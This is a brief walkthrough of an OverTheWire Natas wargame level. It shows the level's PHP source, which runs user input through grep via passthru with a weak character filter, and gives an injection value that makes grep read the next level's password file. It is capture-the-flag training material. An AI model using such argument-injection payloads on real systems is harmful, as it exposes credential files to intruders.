## Level 11

**URL**: [Level 10](http://natas10.natas.labs.overthewire.org/)

 1. [View sourcecode](http://natas10.natas.labs.overthewire.org/index-source.html)
	 ``` php
	   $key = "";  
		if(array_key_exists("needle", $_REQUEST)) {  
			$key = $_REQUEST["needle"];  
		}  
		if($key != "") {  
			if(preg_match('/[;|&]/',$key)) {  
				print "Input contains an illegal character!";  
			} else {  
				passthru("grep -i $key dictionary.txt");  
			}
		}
	```
	
 2. **All passwords are stored in /etc/natas_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
 3. Now run the grep command on the password file instead of the dictionary file:
	```
	. /etc/natas_webpass/natas11 #
	```

